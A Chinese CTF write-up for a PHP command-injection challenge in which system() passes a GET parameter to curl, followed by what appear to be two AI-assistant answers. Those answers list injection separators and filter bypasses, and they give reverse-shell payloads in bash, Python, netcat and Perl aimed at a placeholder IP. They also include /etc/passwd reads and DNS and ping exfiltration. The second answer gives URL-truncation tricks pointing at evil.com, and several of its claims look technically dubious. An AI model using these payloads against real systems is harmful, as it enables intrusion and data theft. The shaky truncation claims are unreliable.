```php
<?php if(isset($_GET['url'])){        system("curl https://".$_GET['url'].".ctf.show");  
}else{        show_source(__FILE__);  
} ?>
```

白盒测试，由于前面几个题是JNDI漏洞，所以本题就想测试dnslog，结果因为是https协议不能爆参数，特意研究的url截断%23 即#没有用到，于是改焕思路，拼接多个命令来由外面的system执行，使用逻辑或(||)进行命令连接  得到
payload `?url=123||ls||`
``?url=123||cat flag||``
得到 `ctfshow{864cd7e0-0aa9-4327-935d-8ad8b295ea9c}`


-----


system里面拼接命令




          
我来分析这个命令注入漏洞的可能性和利用方法。

## 漏洞分析

原始代码:
```php
system("curl https://".$_GET['url'].".ctf.show");
```

这是一个典型的命令注入漏洞，用户输入的`$_GET['url']`直接拼接到shell命令中，没有经过适当的过滤或转义。

## 命令拼接的利用方法

### 1. 使用分号(;)进行命令分隔
```
?url=test;id
```
执行效果:
```bash
curl https://test;id.ctf.show
```
这会执行两个命令: `curl https://test` 和 `id`

### 2. 使用管道符(|)进行命令连接
```
?url=test|id
```
执行效果:
```bash
curl https://test|id.ctf.show
```
这会将curl的输出传递给id命令。

### 3. 使用逻辑或(||)进行命令连接
```
?url=test||id
```
执行效果:
```bash
curl https://test||id.ctf.show
```
如果第一个命令执行失败，则执行第二个命令。

### 4. 使用逻辑与(&&)进行命令连接
```
?url=test&&id
```
执行效果:
```bash
curl https://test&&id.ctf.show
```
只有第一个命令执行成功后才会执行第二个命令。

### 5. 使用反引号(`)进行命令替换
```
?url=test`id`
```
执行效果:
```bash
curl https://test`id`.ctf.show
```
反引号内的命令会先执行，然后将结果插入到URL中。

### 6. 使用$()进行命令替换
```
?url=test$(id)
```
执行效果:
```bash
curl https://test$(id).ctf.show
```
$()内的命令会先执行，然后将结果插入到URL中。

### 7. 使用换行符(%0a)分割命令
```
?url=test%0aid
```
执行效果:
```bash
curl https://test
id.ctf.show
```
%0a是换行符，可以用来分割命令。

### 8. 使用回车符(%0d)分割命令
```
?url=test%0did
```
执行效果:
```bash
curl https://test
id.ctf.show
```

### 9. 使用重定向符号
```
?url=test>output.txt
```
执行效果:
```bash
curl https://test>output.txt.ctf.show
```
将curl的输出重定向到文件。

### 10. 使用后台执行符(&)
```
?url=test&id
```
执行效果:
```bash
curl https://test&id.ctf.show
```
将命令放到后台执行。

## 获取反向Shell的具体Payload

### 1. 基本反向Shell
```
?url=test;bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1
```

### 2. URL编码的反向Shell
```
?url=test;bash%20-i%20>%26%20/dev/tcp/YOUR_IP/YOUR_PORT%200>%261
```

### 3. 使用Python的反向Shell
```
?url=test;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",YOUR_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### 4. 使用Netcat的反向Shell
```
?url=test;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP YOUR_PORT >/tmp/f
```

### 5. 使用Perl的反向Shell
```
?url=test;perl -e 'use Socket;$i="YOUR_IP";$p=YOUR_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## 绕过过滤的技巧

### 1. 使用变量
```
?url=test;${IFS}id
```
`${IFS}`是bash中的内部字段分隔符，通常为空格。

### 2. 使用环境变量
```
?url=test;$PATH$id
```
某些环境中可能有用。

### 3. 使用引号
```
?url=test;'id'
?url=test;"id"
```

### 4. 使用编码
```
?url=test;$(echo 'aWQ=' | base64 -d)
```

### 5. 使用字符串拼接
```
?url=test;$(echo id)
```

### 6. 使用通配符
```
?url=test;/???/id
```
利用通配符匹配`/usr/bin/id`等路径。

## 信息收集命令

### 1. 查看当前用户
```
?url=test;whoami
```

### 2. 查看当前目录
```
?url=test;pwd
```

### 3. 查看系统信息
```
?url=test;uname -a
```

### 4. 查看网络连接
```
?url=test;netstat -an
```

### 5. 查看进程
```
?url=test;ps aux
```

### 6. 查看文件
```
?url=test;ls -la
```

### 7. 查看环境变量
```
?url=test;env
```

## 文件读取Payload

### 1. 读取flag文件
```
?url=test;cat /flag
```

### 2. 读取/etc/passwd
```
?url=test;cat /etc/passwd
```

### 3. 递归查找flag
```
?url=test;find / -name flag 2>/dev/null
```

### 4. 查找包含flag的文件
```
?url=test;grep -r "flag" / 2>/dev/null
```

## 数据外带方法

### 1. 使用DNS请求外带数据
```
?url=test;curl http://$(whoami).YOUR_DNSLOG_PLATFORM
```

### 2. 使用ping请求外带数据
```
?url=test;ping -c 1 $(whoami).YOUR_DNSLOG_PLATFORM
```

## 防护建议

为了防止此类命令注入漏洞，应采取以下措施：

1. **输入验证**：严格验证用户输入，只允许预期的字符。
2. **使用安全的API**：避免直接调用shell命令，使用语言提供的安全API。
3. **参数化命令**：如果必须执行shell命令，使用参数化的方式传递参数。
4. **最小权限原则**：以最低权限运行Web应用程序。
5. **输出编码**：对所有用户输入进行适当的编码和转义。

这些技术应该仅在合法授权的渗透测试环境中使用，未经授权的使用可能违反法律。

---



curl绕过url



          
我来分析这个URL截断问题，并提供多种修改方法。

## 问题分析

原始代码:
```php
curl https://".$_GET['url'].".ctf.show"
```

目标是通过控制`$_GET['url']`参数来截断URL后面的部分，实现URL跳转或注入。

## 修改方法列表

### 1. 使用URL编码截断
```
?url=https://evil.com%23
```
结果: `curl https://https://evil.com#.ctf.show`
`%23`是`#`的URL编码，会作为片段标识符截断后续内容

### 2. 使用查询参数截断
```
?url=https://evil.com?
```
结果: `curl https://https://evil.com?.ctf.show`
问号会开始一个新的查询字符串，`.ctf.show`可能被忽略

### 3. 使用锚点截断
```
?url=https://evil.com#skip
```
结果: `curl https://https://evil.com#.ctf.show`
`#`之后的内容被视为页面锚点，不会发送到服务器

### 4. 使用特殊字符截断
```
?url=https://evil.com/;
```
结果: `curl https://https://evil.com/;.ctf.show`
分号在某些情况下可能会截断后续内容

### 5. 使用路径遍历
```
?url=https://evil.com/..
```
结果: `curl https://https://evil.com/...ctf.show`
可能会改变路径解析

### 6. 使用IP地址绕过
```
?url=127.0.0.1
```
结果: `curl https://127.0.0.1.ctf.show`
如果127.0.0.1.ctf.show指向本地，可能有特殊用途

### 7. 使用端口指定
```
?url=evil.com:8080
```
结果: `curl https://evil.com:8080.ctf.show`
指定特定端口

### 8. 使用认证信息
```
?url=user:pass@evil.com
```
结果: `curl https://user:pass@evil.com.ctf.show`
添加认证信息

### 9. 使用百分号编码
```
?url=https://%65%76%69%6c.com
```
结果: `curl https://https://%65%76%69%6c.com.ctf.show`
`%65%76%69%6c`解码后是"evil"

### 10. 使用Unicode编码
```
?url=https://evil.com\u0023
```
结果: `curl https://https://evil.com#.ctf.show`
`\u0023`是`#`的Unicode编码

### 11. 使用协议相对URL
```
?url=//evil.com
```
结果: `curl https:////evil.com.ctf.show`
浏览器可能会将其解释为`https://evil.com`

### 12. 使用反斜杠
```
?url=https://evil.com\\.ctf.show
```
结果: `curl https://https://evil.com\.ctf.show`
在某些系统中反斜杠可能被转换

### 13. 使用换行符
```
?url=https://evil.com%0a
```
结果: `curl https://https://evil.com
.ctf.show`
`%0a`是换行符，可能导致解析错误

### 14. 使用回车符
```
?url=https://evil.com%0d
```
结果: `curl https://https://evil.com
.ctf.show`
`%0d`是回车符，可能导致解析问题

### 15. 使用空字符
```
?url=https://evil.com%00
```
结果: `curl https://https://evil.com%00.ctf.show`
空字符可能导致字符串截断

### 16. 使用多个点
```
?url=................................................evil.com
```
结果: `curl https://................................................evil.com.ctf.show`
长字符串可能导致解析异常

### 17. 使用特殊TLD
```
?url=evil.com.
```
结果: `curl https://evil.com..ctf.show`
额外的点可能影响域名解析

### 18. 使用国际化域名
```
?url=xn--evil-ctf
```
结果: `curl https://xn--evil-ctf.ctf.show`
Punycode编码的国际化域名

## 最有效的几种方法

基于常见的URL解析行为，以下几种方法最有可能成功：

1. **锚点截断**: `?url=https://evil.com#`
2. **查询参数截断**: `?url=https://evil.com?`
3. **特殊字符截断**: `?url=https://evil.com%23`
4. **换行符截断**: `?url=https://evil.com%0a`

这些方法利用了URL解析中的特殊字符处理规则，可能会导致`.ctf.show`部分被忽略或作为无关部分处理。
        